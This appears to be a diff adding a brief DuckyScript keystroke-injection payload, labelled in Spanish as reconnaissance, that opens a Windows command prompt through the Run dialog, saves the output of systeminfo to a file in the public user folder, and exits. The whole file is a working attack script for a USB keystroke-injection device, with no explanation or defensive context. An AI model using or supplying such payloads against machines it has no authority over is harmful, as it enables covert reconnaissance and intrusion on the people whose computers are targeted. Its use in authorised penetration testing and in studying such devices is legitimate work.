@@ -1,0 +1,11 @@
+REM Reconocimiento (Información del sistema)
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING systeminfo > C:\Users\Public\info.txt
+ENTER
+STRING exit
+ENTER
